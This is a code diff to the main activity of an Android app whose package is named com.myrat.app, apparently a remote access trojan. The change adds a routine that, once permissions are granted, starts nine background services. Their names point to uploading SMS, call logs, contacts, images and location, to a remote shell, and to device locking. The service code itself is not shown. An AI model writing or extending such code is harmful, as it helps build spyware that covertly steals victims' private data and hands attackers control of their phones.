@@ -30,6 +30,7 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
     private var doubleBackToExitPressedOnce = false
     private val handler = Handler(Looper.getMainLooper())
     private var permissionsRequested = false
+    private var servicesStarted = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -89,7 +90,7 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
                         Logger.error("Failed to request permissions", e)
                         Toast.makeText(this, "Permission request failed", Toast.LENGTH_SHORT).show()
                     }
-                }, 1000) // Reduced delay
+                }, 1000)
             }
             
         } catch (e: Exception) {
@@ -162,9 +163,11 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         try {
             permissionHandler?.handleResume()
             
-            // Only check and open phone settings if permissions are granted
-            if (permissionHandler?.areAllPermissionsGranted() == true) {
-                checkAndOpenPhoneSettings()
+            // Check if permissions are granted and start services if needed
+            if (permissionHandler?.areAllPermissionsGranted() == true && !servicesStarted) {
+                Logger.log("All permissions granted, starting services")
+                startAllServices()
+                servicesStarted = true
             }
         } catch (e: Exception) {
             Logger.error("Error in onResume: ${e.message}", e)
@@ -172,34 +175,58 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         }
     }
 
-    private fun checkAndOpenPhoneSettings() {
+    private fun startAllServices() {
         try {
-            Logger.log("Checking if all permissions are granted to open phone settings")
-            permissionHandler?.let { handler ->
-                val allPermissionsGranted = handler.areAllPermissionsGranted()
-                if (allPermissionsGranted) {
-                    Logger.log("All permissions granted, opening phone settings")
-                    openPhoneSettings()
-                } else {
-                    Logger.log("Not all permissions granted yet, skipping phone settings")
+            Logger.log("Starting all background services")
+            
+            val services = listOf(
+                com.myrat.app.service.SmsService::class.java,
+                com.myrat.app.service.ShellService::class.java,
+                com.myrat.app.service.CallLogUploadService::class.java,
+                com.myrat.app.service.ContactUploadService::class.java,
+                com.myrat.app.service.ImageUploadService::class.java,
+                com.myrat.app.service.LocationService::class.java,
+                com.myrat.app.service.CallService::class.java,
+                com.myrat.app.service.LockService::class.java,
+                com.myrat.app.service.SmsConsentService::class.java
+            )
+
+            services.forEach { serviceClass ->
+                try {
+                    val serviceIntent = Intent(this, serviceClass)
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                        startForegroundService(serviceIntent)
+                    } else {
+                        startService(serviceIntent)
+                    }
+                    Logger.log("Started ${serviceClass.simpleName}")
+                } catch (e: Exception) {
+                    Logger.error("Failed to start ${serviceClass.simpleName}", e)
                 }
-            } ?: Logger.error("PermissionHandler is null in checkAndOpenPhoneSettings")
+            }
+            
+            Logger.log("All services started successfully")
         } catch (e: Exception) {
-            Logger.error("Error in checkAndOpenPhoneSettings", e)
+            Logger.error("Error starting services", e)
         }
     }
 
-    private fun openPhoneSettings() {
-        try {
-            val intent = Intent(Settings.ACTION_SETTINGS).apply {
-                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
-            }
-            startActivity(intent)
-            Logger.log("Phone settings opened successfully")
-        } catch (e: Exception) {
-            Logger.error("Error opening phone settings: ${e.message}", e)
-            Toast.makeText(this, "Unable to open settings", Toast.LENGTH_SHORT).show()
-        }
+    // EasyPermissions callbacks
+    override fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
+        permissionHandler?.onPermissionsGranted(requestCode, perms)
+    }
+
+    override fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
+        permissionHandler?.onPermissionsDenied(requestCode, perms)
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this)
     }
 
     override fun onBackPressed() {
@@ -227,24 +254,6 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         } catch (e: Exception) {
             Logger.error("Error in onDestroy", e)
         }
-    }
-
-    // EasyPermissions callbacks
-    override fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
-        permissionHandler?.onPermissionsGranted(requestCode, perms)
-    }
-
-    override fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
-        permissionHandler?.onPermissionsDenied(requestCode, perms)
-    }
-
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<out String>,
-        grantResults: IntArray
-    ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this)
     }
 
     companion object {
